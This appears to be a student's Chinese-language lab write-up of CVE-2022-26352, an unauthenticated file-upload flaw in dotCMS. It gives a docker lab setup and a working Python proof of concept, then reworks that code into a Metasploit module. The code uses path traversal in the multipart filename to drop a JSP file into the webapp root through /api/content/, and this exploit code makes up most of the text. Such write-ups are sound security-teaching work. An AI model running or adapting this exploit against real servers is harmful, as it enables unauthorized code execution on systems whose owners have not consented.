---
tags: CVE
---
# cve-2022-26352

## 作者 
黃妤婷: Katherine - 國立成功大學資訊工程學系四年級

## 漏洞名稱
Dotcms SI-62 任意文件上傳漏洞

##  漏洞說明/描述(成因)
#### 漏洞簡介:

Dotcms dotCMS是美國dotCMS（Dotcms）公司的一套内容管理系統（CMS）。

該漏洞是由於DotCMS 存在未授權的文件上傳 port ，且對文件名以及文件內容過濾不嚴格，導致攻擊者可以將一個 .jsp 的文件上傳到 dotCMS 的 webapp/ROOT 目錄，從而允許執行 RCE 。

#### 漏洞類型:
* RCE
    > 遠端程式碼執行（Remote Code Execution)

#### 影響範圍:
* DotCMS < 22.03
* DotCMS < 21.06.7
* DotCMS < 5.3.8.10

## 漏洞環境建置

### docker-compose.yaml
1. 從[這裡](https://github.com/h1ei1/POC/tree/main/CVE-2022-26352)下載 `docker-compose.yml` 並在該目錄下執行 `docker-compose up -d` 來啟動環境
2. 而後訪問 `https://{ip}:8443/dotAdmin`

![](https://i.imgur.com/i6QbVai.png)


## Metasploit testcase
* 以下是我在靶機內所寫的 python POC:
    ```python
    import requests, urllib3, sys
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    def find_base_url(args):
        base_url = 'https://{}:{}'.format(args['rhost'], args['RPORT'])
        return base_url

    def make_shell():
        shell = """<FORM>
        <INPUT name='cmd' type=text>
        <INPUT type=submit value='Run'>
    </FORM>
    <%@ page import="java.io.*" %>
        <%
            File jsp=new File(getServletContext().getRealPath(File.separator) + File.separator + "#{test_file}");
            jsp.delete();
    %>
        """
        return shell

    def exploit(base_url,url,files,args):
        #https://{ip}:{port}/dotAdmin
        try:
            r = requests.get(url,verify=False,timeout=3)
        except Exception as e:
            return False


        new_url = base_url + "/api/content/"
        try:
            response = requests.post(new_url , files=files, verify=False)
        except Exception as e:
            print("/api/content/ error")
            return False
        print(response.status_code)

        url = base_url + "/abc.jsp"
        print(url)
        try:
            r = requests.get(url,verify = False)
            print(r.status_code)
            print(r.text)
            if r and r.status_code == 200:
                print("success")
        except Exception as e:
            print("error")

        print("completed exploit")
        return True

    def main ():
        args = {
            'RPORT': '8443',
            'TARGETURI': '/',
            'METHOD': 'GET',
            'rhost': '192.168.50.48'
        }

        base_url = find_base_url(args)
        shell = make_shell()  
        files = {f"../../../../../../../../../srv/dotserver/tomcat-9.0.41/webapps/ROOT/html/js/dojo/abc.jsp": shell}
        #files = {f"../../abc.jsp": shell}

        #url = "https://" + args['rhost'] + ":" + args['RPORT'] + "/dotAdmin"
        url = base_url + "/dotAdmin"

        if exploit(base_url,url,files,args) :
            print("Vulnerable")
        else: 
            print("exploit Error")

    if __name__ == '__main__':
        main()
    ```
    * 上傳 `abc.jsp` 成功之截圖
    ![](https://i.imgur.com/mfPMQyA.png)

    
* 在靶機使用 python 確認該 POC 可行，之後在攻擊主機上試著把它改寫為 metasploit external module
    * 將檔案存在`.msf4/modules/auxiliary/scanner/http` 裡面，並命名為 `dotcms_file_upload_rce.py`

    ```python
    #!/usr/bin/env python3

    # standard modules
    from metasploit import module

    # extra modules
    dependencies_missing = False
    try:
        import requests
        import urllib3
        import sys
        import time
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    except ImportError:
        dependencies_missing = True

    metadata = {
        'name': 'DotCMS RCE via Arbitrary File Upload.',
        'description': '''
            When files are uploaded into dotCMS via the content API, but before they become content, dotCMS writes the
              file down in a temp directory.  In the case of this vulnerability, dotCMS does not sanitize the filename
              passed in via the multipart request header and thus does not sanitize the temp file's name.  This allows a
              specially crafted request to POST files to dotCMS via the ContentResource (POST /api/content)  that get
              written outside of the dotCMS temp directory.  In the case of this exploit, an attacker can upload a harmless
              .jsp file to the webapp/ROOT directory of dotCMS.
        ''',
        'authors': [
            'yuting',
        ],
        'date': '2022-07-07',
        'license': 'MSF_LICENSE',
        'references': [
                                    {'type': 'url', 'ref': 'https://github.com/jheysel-r7/metasploit-framework/blob/dotcms_file_upload_rce/modules/exploits/multi/http/dotcms_file_upload_rce.rb'},
            {'type': 'cve', 'ref': '2022-26352'}
        ],
        'type': 'single_scanner',
        'options': {
            'RPORT': {'type': 'int', 'description': 'Target port', 'required': True, 'default': '/'},
            'TARGETURI': {'type': 'string', 'description': 'The base path', 'required': True, 'default': '/'},
            'METHOD': {'type': 'string', 'description': 'Vulunarable HTTP method', 'required': True, 'default': 'POST'}
        }
    }

    def find_base_url(args):
        base_url = 'https://{}:{}'.format(args['rhost'], args['RPORT'])
        return base_url

    def make_shell():
        shell = """<FORM>
        <INPUT name='cmd' type=text>
        <INPUT type=submit value='Run'>
    </FORM>
    <%@ page import="java.io.*" %>
        <%
            File jsp=new File(getServletContext().getRealPath(File.separator) + File.separator + "#{test_file}");
            jsp.delete();
    %>
        """
        return shell

    def exploit(base_url,url,files):
        #https://{ip}:{port}/dotAdmin
        try:
            r = requests.get(url,verify=False,timeout=3)
        except Exception as e:
            module.log(str(e), level='error')
            return False
        module.log('Target is Valid', level='good')

        new_url = base_url + "/api/content/"
        try:
            response = requests.post(new_url , files=files, verify=False)
        except Exception as e:
            module.log('/api/content/ error', level='error')
            module.log(str(e), level='error')
            return False
        #print(response.status_code)

        url = base_url + "/abc.jsp"
        try:
            r = requests.get(url,verify = False)
            if r and r.status_code == 200:
                module.log('Successfully upload abc.jsp', level='good')
        except Exception as e:
            module.log('Failed to upload abc.jsp', level='error')
            return False

        return True

    def run(args):
        try:
            # dependency check
            if dependencies_missing:
                module.log('Module dependency (requests) is missing, cannot continue', level='error')
                return

            base_url = find_base_url(args)
            shell = make_shell()
            files = {f"../../../../../../../../../srv/dotserver/tomcat-9.0.41/webapps/ROOT/html/js/dojo/abc.jsp": shell}

            url = base_url + "/dotAdmin"

            if exploit(base_url,url,files) :
                module.log('Exploit completed', level='good')
            else:
                module.log('Exploit failed', level='error')

        except Exception as e:
            module.log(str(e), level='error')

    if __name__ == '__main__':
        module.run(metadata, run)
    ```

## 在Metasploit中使用testcase, 對靶機掃描/利用成功之截圖
![](https://i.imgur.com/m4iSKHZ.png)



-----
### 參考資料

https://nosec.org/home/detail/5007.html

https://www.henry4e36.top/index.php/archives/40.html#cl-3

https://github.com/jheysel-r7/metasploit-framework/blob/dotcms_file_upload_rce/modules/exploits/multi/http/dotcms_file_upload_rce.rb

https://blog.assetnote.io/2022/05/03/dotcms-rce-advisory/




